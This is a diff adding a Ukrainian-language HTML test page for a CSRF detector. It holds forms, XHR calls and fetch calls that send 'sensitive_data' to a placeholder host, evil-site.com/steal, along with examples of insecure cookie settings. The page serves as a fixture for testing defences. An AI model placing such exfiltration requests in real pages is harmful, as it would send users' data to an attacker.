@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <title>Тестова сторінка для CSRF Detector</title>
+</head>
+<body>
+    <h1>Тестова сторінка для CSRF Detector</h1>
+
+    <!-- Тестова форма з небезпечним методом -->
+    <div class="test-section">
+        <h2>1. Тест небезпечної форми (GET)</h2>
+        <form action="https://evil-site.com/steal" method="GET">
+            <input type="text" name="sensitive_data" value="test_data">
+            <button type="submit">Відправити (GET)</button>
+        </form>
+    </div>
+
+    <!-- Тестова форма з безпечним методом -->
+    <div class="test-section">
+        <h2>2. Тест безпечної форми (POST)</h2>
+        <form action="https://evil-site.com/steal" method="POST">
+            <input type="text" name="sensitive_data" value="test_data">
+            <button type="submit">Відправити (POST)</button>
+        </form>
+    </div>
+
+    <!-- Тест AJAX запитів -->
+    <div class="test-section">
+        <h2>3. Тест AJAX запитів</h2>
+        <button onclick="testXHR()">Тест XHR запиту</button>
+        <button onclick="testFetch()">Тест Fetch запиту</button>
+    </div>
+
+    <!-- Тест кукі -->
+    <div class="test-section">
+        <h2>4. Тест кукі</h2>
+        <button onclick="setTestCookies()">Встановити тестові кукі</button>
+    </div>
+
+    <script>
+        // Функція для тестування XHR
+        function testXHR() {
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://evil-site.com/api/steal');
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({ data: 'sensitive_data' }));
+        }
+
+        // Функція для тестування Fetch
+        function testFetch() {
+            fetch('https://evil-site.com/api/steal', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ data: 'sensitive_data' })
+            });
+        }
+
+        // Функція для встановлення тестових кукі
+        function setTestCookies() {
+            // Безпечне кукі
+            document.cookie = "secure_cookie=value; Secure; SameSite=Strict";
+            
+            // Небезпечне кукі
+            document.cookie = "insecure_cookie=value";
+            
+            // Кукі без SameSite
+            document.cookie = "nosamesite_cookie=value; Secure";
+            
+            alert('Тестові кукі встановлено!');
+        }
+    </script>
+
+    <style>
+        .test-section {
+            margin: 20px 0;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            margin: 5px;
+            padding: 8px 16px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</body>
+</html>
